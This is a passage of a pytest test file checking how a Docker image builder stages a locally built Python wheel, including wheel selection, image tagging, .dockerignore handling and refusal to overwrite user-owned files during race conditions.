        with pytest.raises(ValueError, match="local build identifier"):
            template.render_fabric_dockerfile(fabric_agent_config)


class TestFabricWheelInstall:
    """A source checkout reports a version no index serves, so packaging from one
    requires installing a locally built wheel instead of resolving the pin.

    The wheel arrives by env var rather than a flag so it reaches the platform
    job as well as the CLI; a flag would fix only one of the two."""

    def test_render_installs_the_wheel_instead_of_the_pin(self, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_fabric_dockerfile

        result = render_fabric_dockerfile(fabric_agent_config, wheel_filename="nemo_platform-0.4.0-py3-none-any.whl")

        assert '"/workspace/nemo_platform-0.4.0-py3-none-any.whl[nemo-agents-plugin]"' in result
        assert "nemo-platform[nemo-agents-plugin]==" not in result

    def test_a_wheel_lifts_the_unpublished_version_guard(
        self, fabric_agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import nemo_agents_plugin.container.template as template

        monkeypatch.setattr(template, "get_contract_version", lambda: "0.4.0.post176.dev0+50998e7b84")

        # Without a wheel the same version is refused.
        with pytest.raises(ValueError, match="local build identifier"):
            template.render_fabric_dockerfile(fabric_agent_config)

        assert template.render_fabric_dockerfile(fabric_agent_config, wheel_filename="x.whl")

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_wheel_is_staged_into_the_context_and_removed(
        self,
        mock_build: MagicMock,
        fabric_agent_config: Path,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"not really a wheel")
        context = fabric_agent_config.parent
        staged_during_build: dict[str, bool] = {}
        source_reads = 0
        original_open = Path.open

        def _count_source_reads(self: Path, *args: Any, **kwargs: Any) -> Any:
            nonlocal source_reads
            mode = args[0] if args else kwargs.get("mode", "r")
            if self == wheel and mode == "rb":
                source_reads += 1
            return original_open(self, *args, **kwargs)

        monkeypatch.setattr(Path, "open", _count_source_reads)
        mock_build.side_effect = lambda **kwargs: staged_during_build.setdefault(
            "present", (context / wheel.name).exists()
        )

        build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True, agent_author="x")

        assert staged_during_build["present"], "the wheel must exist while docker build runs"
        assert source_reads == 1, "staging must hash and copy the source in one pass"
        assert not (context / wheel.name).exists(), "the staged wheel must not outlive the build"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_env_var_supplies_the_wheel(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image
        from nemo_agents_plugin.container.template import WHEEL_ENV

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        monkeypatch.setenv(WHEEL_ENV, str(wheel))
        context = fabric_agent_config.parent
        seen: dict[str, bool] = {}
        mock_build.side_effect = lambda **kwargs: seen.setdefault("present", (context / wheel.name).exists())

        build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert seen["present"], "the env-supplied wheel must be staged for the build"
        assert not (context / wheel.name).exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_latest_resolves_the_newest_wheel_in_dist(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        dist = tmp_path / "dist"
        dist.mkdir()
        older = dist / "nemo_platform-0.4.0.post1-py3-none-any.whl"
        newer = dist / "nemo_platform-0.4.0.post2-py3-none-any.whl"
        older.write_bytes(b"old")
        newer.write_bytes(b"new")
        os.utime(older, (1, 1))
        os.utime(newer, (2, 2))
        monkeypatch.setattr(builder, "_source_checkout_dist_dir", lambda: dist)
        monkeypatch.setenv(WHEEL_ENV, WHEEL_LATEST)
        context = fabric_agent_config.parent
        seen: dict[str, bool] = {}
        mock_build.side_effect = lambda **kwargs: seen.setdefault("present", (context / newer.name).exists())

        builder.build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert seen["present"], "LATEST must stage the most recently built wheel"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_latest_ignores_wheels_from_other_packages(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        dist = tmp_path / "dist"
        dist.mkdir()
        ours = dist / "nemo_platform-0.4.0-py3-none-any.whl"
        theirs = dist / "nemo_evaluator-9.9.9-py3-none-any.whl"
        ours.write_bytes(b"ours")
        theirs.write_bytes(b"theirs")
        os.utime(ours, (1, 1))
        os.utime(theirs, (2, 2))
        monkeypatch.setattr(builder, "_source_checkout_dist_dir", lambda: dist)
        monkeypatch.setenv(WHEEL_ENV, WHEEL_LATEST)
        context = fabric_agent_config.parent
        seen: dict[str, bool] = {}
        mock_build.side_effect = lambda **kwargs: seen.setdefault("present", (context / ours.name).exists())

        builder.build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert seen["present"], "a newer wheel from another package must not win the sort"
        assert not (context / theirs.name).exists()

    def test_latest_with_only_other_packages_wheels_names_the_build_command(
        self, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        dist = tmp_path / "dist"
        dist.mkdir()
        (dist / "nemo_evaluator-9.9.9-py3-none-any.whl").write_bytes(b"theirs")
        monkeypatch.setattr(builder, "_source_checkout_dist_dir", lambda: dist)
        monkeypatch.setenv(WHEEL_ENV, WHEEL_LATEST)

        with pytest.raises(ValueError) as raised:
            builder.build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert "no nemo-platform wheels" in str(raised.value)
        assert "uv build --package nemo-platform" in str(raised.value)

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_an_existing_path_named_latest_is_not_treated_as_the_sentinel(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        literal = tmp_path / WHEEL_LATEST
        literal.write_bytes(b"wheel")
        monkeypatch.setenv(WHEEL_ENV, str(literal))

        with pytest.raises(ValueError, match="not a wheel"):
            builder.build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

    def test_latest_without_a_source_checkout_says_so(
        self, fabric_agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        monkeypatch.setattr(builder, "_source_checkout_dist_dir", lambda: None)
        monkeypatch.setenv(WHEEL_ENV, WHEEL_LATEST)

        with pytest.raises(ValueError, match="needs a source checkout"):
            builder.build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

    def test_latest_with_an_empty_dist_names_the_build_command(
        self, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        dist = tmp_path / "dist"
        dist.mkdir()
        monkeypatch.setattr(builder, "_source_checkout_dist_dir", lambda: dist)
        monkeypatch.setenv(WHEEL_ENV, WHEEL_LATEST)

        with pytest.raises(ValueError, match="uv build --package nemo-platform"):
            builder.build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_a_supplied_dockerfile_does_not_resolve_latest(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container import builder
        from nemo_agents_plugin.container.template import WHEEL_ENV, WHEEL_LATEST

        def explode() -> Path:
            raise AssertionError("LATEST must not be resolved for a --dockerfile build")

        monkeypatch.setattr(builder, "resolve_latest_wheel", explode)
        monkeypatch.setenv(WHEEL_ENV, WHEEL_LATEST)
        dockerfile = tmp_path / "Dockerfile"
        dockerfile.write_text("FROM scratch\n")
        notices: list[str] = []

        builder.build_fabric_agent_image(
            fabric_agent_config,
            dockerfile=dockerfile,
            skip_validation=True,
            agent_author="x",
            on_progress=notices.append,
        )

        assert any(WHEEL_ENV in line and "ignoring" in line for line in notices)

    @pytest.mark.parametrize(
        ("filename", "create", "match"),
        [("missing.whl", False, "wheel not found"), ("notawheel.txt", True, "not a wheel")],
    )
    def test_bad_wheel_paths_are_rejected(
        self, fabric_agent_config: Path, tmp_path: Path, filename: str, create: bool, match: str
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / filename
        if create:
            wheel.write_bytes(b"")

        with pytest.raises(ValueError, match=match):
            build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True)

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_a_file_appearing_mid_build_is_not_clobbered(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The pre-stage check is not atomic with the copy, so the copy creates
        exclusively — otherwise losing that race overwrites a file and the cleanup
        then deletes it."""
        import nemo_agents_plugin.container.builder as builder

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        collision = fabric_agent_config.parent / wheel.name

        # Simulate another process winning the race after the existence check,
        # immediately before the exclusive create.
        original_open = open

        def _plant(file: Path, mode: str = "r", *args: Any, **kwargs: Any) -> Any:
            if Path(file) == collision and mode == "xb":
                collision.write_text("USER OWNED")
            return original_open(file, mode, *args, **kwargs)

        monkeypatch.setattr(builder, "open", _plant, raising=False)

        with pytest.raises(ManagedFileConflictError):
            builder.build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True, agent_author="x")

        monkeypatch.undo()
        assert collision.read_text() == "USER OWNED"
        mock_build.assert_not_called()

    def test_the_image_advertises_the_wheel_version_not_the_host(
        self, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Labels and the content-addressable id describe the runtime inside the
        image, so a wheel has to decide them — otherwise an image can advertise
        one version while running another, and two different images share an id."""
        import nemo_agents_plugin.container.builder as builder
        import nemo_agents_plugin.container.template as template

        monkeypatch.setattr(template, "get_contract_version", lambda: "9.9.9.dev0+hostonly")
        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0.post176.dev0+abc123-py3-none-any.whl"
        wheel.write_bytes(b"wheel")

        assert builder.wheel_contract_version(wheel) == "0.4.0.post176.dev0+abc123"

        captured: dict[str, object] = {}
        real_render = template.render_fabric_dockerfile
        monkeypatch.setattr(
            builder,
            "docker_build",
            lambda **kwargs: captured.setdefault("tag", kwargs["tag"]),
        )

        def _capture_render(*args: Any, **kwargs: Any) -> str:
            captured.setdefault("contract_version", kwargs.get("contract_version"))
            return real_render(*args, **kwargs)

        monkeypatch.setattr(
            template,
            "render_fabric_dockerfile",
            _capture_render,
        )

        builder.build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True, agent_author="x")

        assert captured["contract_version"] == "0.4.0.post176.dev0+abc123"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_the_image_identity_includes_the_wheel_contents(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        wheel_name = "nemo_platform-0.4.0-py3-none-any.whl"
        first_source = tmp_path / "first"
        first_source.mkdir()
        first_wheel = first_source / wheel_name
        first_wheel.write_bytes(b"first wheel")

        second_source = tmp_path / "second"
        second_source.mkdir()
        second_wheel = second_source / wheel_name
        second_wheel.write_bytes(b"second wheel")

        build_fabric_agent_image(fabric_agent_config, wheel=first_wheel, skip_validation=True, agent_author="x")
        first_tag = mock_build.call_args.kwargs["tag"]

        build_fabric_agent_image(fabric_agent_config, wheel=second_wheel, skip_validation=True, agent_author="x")
        second_tag = mock_build.call_args.kwargs["tag"]

        assert first_tag != second_tag

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_a_supplied_dockerfile_ignores_the_wheel(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A caller-supplied Dockerfile never sees the staged wheel, so letting the
        wheel decide the version would advertise a runtime the image cannot contain."""
        import nemo_agents_plugin.container.builder as builder
        import nemo_agents_plugin.container.template as template

        monkeypatch.setattr(template, "get_contract_version", lambda: "9.9.9")
        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0.post176.dev0+abc123-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        dockerfile = tmp_path / "Dockerfile"
        dockerfile.write_text("FROM scratch\n")
        context = fabric_agent_config.parent

        monkeypatch.setenv(template.WHEEL_ENV, str(wheel))
        notices: list[str] = []
        builder.build_fabric_agent_image(
            fabric_agent_config,
            dockerfile=dockerfile,
            skip_validation=True,
            agent_author="x",
            on_progress=notices.append,
        )
        with_wheel = mock_build.call_args.kwargs["tag"]
        assert not (context / wheel.name).exists()
        assert any(template.WHEEL_ENV in line for line in notices)

        monkeypatch.delenv(template.WHEEL_ENV)
        builder.build_fabric_agent_image(
            fabric_agent_config, dockerfile=dockerfile, skip_validation=True, agent_author="x"
        )

        assert with_wheel == mock_build.call_args.kwargs["tag"], "the wheel must not reach the image identity"

    @pytest.mark.parametrize(
        "filename",
        ["some_other_package-1.0-py3-none-any.whl", "notawheelname.whl"],
    )
    def test_a_wheel_for_another_package_is_rejected(self, tmp_path: Path, filename: str) -> None:
        from nemo_agents_plugin.container.builder import wheel_contract_version

        with pytest.raises(ValueError):
            wheel_contract_version(tmp_path / filename)

    @pytest.mark.parametrize("rule", ["*.whl", "/*.whl", "**/*.whl", "nemo_platform-*.whl"])
    def test_a_user_rule_cannot_exclude_the_staged_wheel(
        self, fabric_agent_config: Path, tmp_path: Path, rule: str
    ) -> None:
        """A user-owned .dockerignore is preserved, and any of these rules would
        drop the wheel from the context. BuildKit prefers the per-Dockerfile
        ignore file, so the wheel is re-included there rather than the rules
        being second-guessed."""
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        context = fabric_agent_config.parent
        (context / ".dockerignore").write_text(f"# user owned\n{rule}\n")
        scoped = context / "Dockerfile.generated.dockerignore"
        seen: dict[str, str] = {}

        with patch("nemo_agents_plugin.container.builder.docker_build") as mock_build:
            mock_build.side_effect = lambda **kwargs: seen.setdefault("ignore", scoped.read_text())
            build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True, agent_author="x")

        assert rule in seen["ignore"], "the user's rules must be carried over"
        assert seen["ignore"].rstrip().endswith(f"!{wheel.name}"), "the wheel must be re-included last"
        assert not scoped.exists(), "the scoped ignore file must not outlive the build"

    def test_no_scoped_ignore_file_without_a_wheel(self, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        context = fabric_agent_config.parent
        seen: dict[str, bool] = {}

        with patch("nemo_agents_plugin.container.builder.docker_build") as mock_build:
            mock_build.side_effect = lambda **kwargs: seen.setdefault(
                "present", (context / "Dockerfile.generated.dockerignore").exists()
            )
            build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert not seen["present"]

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_exclusive_dockerfile_create_handles_a_race(
        self, mock_build: MagicMock, fabric_agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        generated = fabric_agent_config.parent / "Dockerfile.generated"
        generated.write_text("USER OWNED\n")
        original_exists = Path.exists

        def _miss_generated(self: Path) -> bool:
            if self == generated:
                return False
            return original_exists(self)

        monkeypatch.setattr(Path, "exists", _miss_generated)

        with pytest.raises(ManagedFileConflictError):
            build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert generated.read_text() == "USER OWNED\n"
        mock_build.assert_not_called()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_does_not_remove_a_replaced_generated_dockerfile(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        generated = fabric_agent_config.parent / "Dockerfile.generated"
        replacement = tmp_path / "replacement.Dockerfile"
        replacement.write_text("USER REPLACEMENT\n")

        def _replace_generated(**kwargs: Any) -> str:
            os.replace(replacement, generated)
            return "image-id"

        mock_build.side_effect = _replace_generated

        build_fabric_agent_image(fabric_agent_config, skip_validation=True, agent_author="x")

        assert generated.read_text() == "USER REPLACEMENT\n"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_refuses_to_clobber_a_scoped_ignore_file(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        context = fabric_agent_config.parent
        scoped = context / "Dockerfile.generated.dockerignore"
        scoped.write_text("USER OWNED\n")

        with pytest.raises(ManagedFileConflictError):
            build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True, agent_author="x")

        assert scoped.read_text() == "USER OWNED\n"
        assert not (context / wheel.name).exists()
        mock_build.assert_not_called()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_does_not_remove_a_replaced_scoped_ignore_file(
        self, mock_build: MagicMock, fabric_agent_config: Path, tmp_path: Path
    ) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        context = fabric_agent_config.parent
        scoped = context / "Dockerfile.generated.dockerignore"
        replacement = tmp_path / "replacement.ignore"
        replacement.write_text("REPLACEMENT\n")

        def _replace_scoped_ignore(**kwargs: Any) -> str:
            os.replace(replacement, scoped)
            return "image-id"

        mock_build.side_effect = _replace_scoped_ignore

        build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True, agent_author="x")

        assert scoped.read_text() == "REPLACEMENT\n"
        assert not (context / wheel.name).exists()

    def test_refuses_to_clobber_a_file_the_user_owns(self, fabric_agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        source = tmp_path / "dist"
        source.mkdir()
        wheel = source / "nemo_platform-0.4.0-py3-none-any.whl"
        wheel.write_bytes(b"wheel")
        collision = fabric_agent_config.parent / wheel.name
        collision.write_text("USER OWNED")

        with pytest.raises(ManagedFileConflictError):
            build_fabric_agent_image(fabric_agent_config, wheel=wheel, skip_validation=True)

        assert collision.read_text() == "USER OWNED"
